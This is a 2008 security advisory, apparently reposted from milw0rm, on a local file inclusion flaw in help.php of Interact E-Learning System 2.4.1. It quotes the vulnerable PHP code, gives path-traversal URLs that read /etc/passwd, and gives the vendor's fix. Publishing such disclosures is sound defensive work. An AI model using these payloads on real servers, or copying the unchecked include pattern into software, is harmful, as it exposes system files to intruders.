@@ -1,0 +1,65 @@
+Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-31
+
+
+Application:                    Interact E-Learning System
+Versions Affected:              2.4.1
+Vendor URL:                     http://sourceforge.net/projects/cce-interact
+Bug:                            Local File Include
+Exploits:                       YES
+Reported:                       03.07.2008
+Vendor response:                04.07.2008
+Solution:                       YES
+Date of Public Advisory:        21.07.2008
+Authors:                        Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+Description
+***********
+
+Interact E-Learning System system has local file include vulnerability in script help/help.php
+
+Vulnerable GET parameters "module", "file".
+
+Code
+****
+#################################################
+
+$module = isset($_GET['module']) ? $_GET['module']:'';
+$file   = isset($_GET['file']) ? $_GET['file']:'';
+
+...
+
+$hpath=$CONFIG['BASE_PATH'].'/language/'.$_SESSION['language'].'/help/'.$module.'/'.$file;
+if (is_file($hpath)){
+        require_once($hpath);
+} else {
+        require_once($CONFIG['BASE_PATH'].'/language/default/help/'.$module.'/'.$file);
+}
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/help/help.php?module=../../../../../../../../../../../../../etc/passwd%00
+http://[server]/[installdir]/help/help.php?file=../../../../../../../../../../../../../etc/passwd
+
+
+
+Solution
+********
+
+This file is no longer required by the system. Remove it from installation.
+
+Vendor response:
+
+"I have posted an alert to users to remove this from their installations asap and will get it removed from the next release of the package."
+
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+# milw0rm.com [2008-07-21]
